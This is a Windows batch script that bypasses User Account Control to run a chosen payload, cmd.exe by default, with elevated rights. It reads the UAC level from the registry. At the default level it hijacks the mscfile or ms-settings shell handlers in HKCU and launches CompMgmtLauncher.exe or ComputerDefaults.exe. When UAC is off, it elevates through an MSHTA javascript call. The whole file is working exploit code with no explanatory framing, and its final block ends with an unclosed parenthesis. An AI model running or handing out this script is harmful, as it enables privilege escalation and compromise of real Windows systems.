@echo off
if "%~1" equ "" (set PAYLOAD=cmd.exe) ELSE (set PAYLOAD=%~1)

net session >nul 2>&1
if %ERRORLEVEL% equ 0 (
%PAYLOAD%
exit
)

::REQUIREMENTS
whoami /groups|findstr /i "\<S-1-5-32-544\>" >nul 2>&1
if ERRORLEVEL 1 exit /b 1

::Windows Version
for /f "tokens=4-5 delims=. " %%i in ('ver') do set WIN_VER=%%i.%%j

::Check UAC Level
set key="HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System"
for /f "skip=2 tokens=3" %%a in ('REG QUERY %key% /v ConsentPromptBehaviorAdmin') do set UAC=%%a
if "%UAC%" equ "0x2" set UAC_LEVEL=High
if "%UAC%" equ "0x5" set UAC_LEVEL=Default
if "%UAC%" equ "0x0" set UAC_LEVEL=None

::EXPLOIT
if "%UAC_LEVEL%" equ "High" exit /b 1
if "%UAC_LEVEL%" equ "Default" (
for %%x in (6.1 6.2 6.3) do if "%WIN_VER%" equ "%%x" call :exploit mscfile CompMgmtLauncher.exe %PAYLOAD%
if "%WIN_VER%" equ "10.0" call :exploit ms-settings ComputerDefaults.exe %PAYLOAD%
)
if "%UAC_LEVEL%" equ "None" (
MSHTA "javascript: var shell = new ActiveXObject('shell.application'); shell.ShellExecute('%PAYLOAD%', '', '', 'runas', 1);close();"
)

(
:exploit
set regPath="HKCU\Software\Classes\%1\shell\open\command"
reg add %regPath% /d "%~3" /f
reg add %regPath% /v DelegateExecute /f
%~2
reg delete "HKCU\Software\Classes\%1" /f
